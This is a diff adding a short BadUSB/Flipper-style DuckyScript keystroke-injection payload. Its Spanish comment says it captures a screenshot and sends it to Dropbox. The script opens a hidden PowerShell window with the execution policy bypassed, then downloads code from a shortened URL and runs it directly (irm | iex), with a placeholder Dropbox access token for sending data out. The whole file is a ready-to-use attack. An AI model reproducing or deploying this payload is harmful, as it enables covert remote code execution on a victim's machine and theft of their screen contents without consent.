@@ -1,0 +1,11 @@
+REM Author: mrflippermen
+REM Date: 2024-07-15
+REM Description: Captura una captura de pantalla y la envía a Dropbox.
+
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+ENTER
+DELAY 4000
+STRING $db='YOUR_DROPBOX_ACCESS_TOKEN';irm https://n9.cl/mrflipper10 | iex
+ENTER
